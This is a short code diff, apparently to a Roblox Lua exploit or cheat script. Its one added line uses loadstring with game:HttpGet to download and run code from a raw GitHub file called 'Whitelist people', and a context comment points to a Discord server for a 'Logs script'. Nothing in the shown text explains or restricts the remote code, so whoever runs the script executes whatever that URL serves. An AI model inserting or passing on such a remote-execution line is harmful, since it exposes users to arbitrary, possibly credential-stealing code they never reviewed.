@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PhantomAngelx/PHANTOM-ANGEL/refs/heads/main/Whitelist%20people"))()
+
 _G.Settings = false
 -- Logs script: https://discord.gg/3kZ7dKbJPe
 
